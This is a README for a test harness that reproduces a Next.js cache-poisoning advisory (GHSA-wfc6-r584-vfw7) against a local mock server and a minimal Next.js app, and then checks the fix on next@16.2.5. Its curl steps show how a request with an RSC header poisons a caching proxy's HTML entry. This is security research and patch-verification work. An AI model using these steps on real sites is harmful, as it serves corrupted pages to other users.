# Vulnerable harness setup — GHSA-wfc6-r584-vfw7

A local mock at `server.py` reproduces both halves of the bug (loose RSC header check +
URL-suffix misclassification with query string). Run the exploit and it auto-launches the
mock; or run the mock manually:

```bash
python3 server.py --port 8082 [--patched]
```

## Real Next.js harness

For a *real* Next.js reproduction you need:

1. Next.js 15.x or 16.2.4 with deployment adapter mode (Vercel-style).
2. A dynamic route segment like `app/[tenant]/samples/page.tsx`.
3. Postponed rendering / cache-components enabled.

`app/[tenant]/samples/page.tsx`:
```tsx
export const dynamic = 'force-dynamic'
export default async function Page({ params }: { params: Promise<{ tenant: string }> }) {
  const { tenant } = await params
  return <main><h1>Tenant: {tenant}</h1><p data-rsc="true">{Date.now()}</p></main>
}
```

`next.config.js`:
```js
module.exports = {
  experimental: { ppr: true, cacheComponents: true },
}
```

Behind any caching reverse proxy (nginx with `proxy_cache_path`, or a Cloudflare-style
edge with default page rules), confirm:

* `curl /[tenant]/samples?nxtPtenant=t` returns HTML (200).
* `curl -H 'RSC: text/x-component' /[tenant]/samples?nxtPtenant=t` returns RSC binary
  with `Content-Type: text/html` — POISON.
* Subsequent `curl /[tenant]/samples?nxtPtenant=t` gets the cached RSC-as-HTML.

## Wiring into the shared harness

Add `app/[tenant]/samples/page.tsx` and the `next.config.js` flags above to
`harness/`. Run `harness/dev.sh` and exercise the exploit script.

## Confirming the patch

After upgrading to `next@16.2.5`, the same exploit:

* gets RSC content-type `text/x-component` for the poisoning request,
* leaves the HTML cache entry untouched.

The mock supports `--patched` to A/B compare:

```bash
python3 server.py --port 8082 --patched
python3 ../exploit.py http://127.0.0.1:8082/tenant-x/samples?nxtPtenant=tenant-x
# -> [-] Likely PATCHED
```
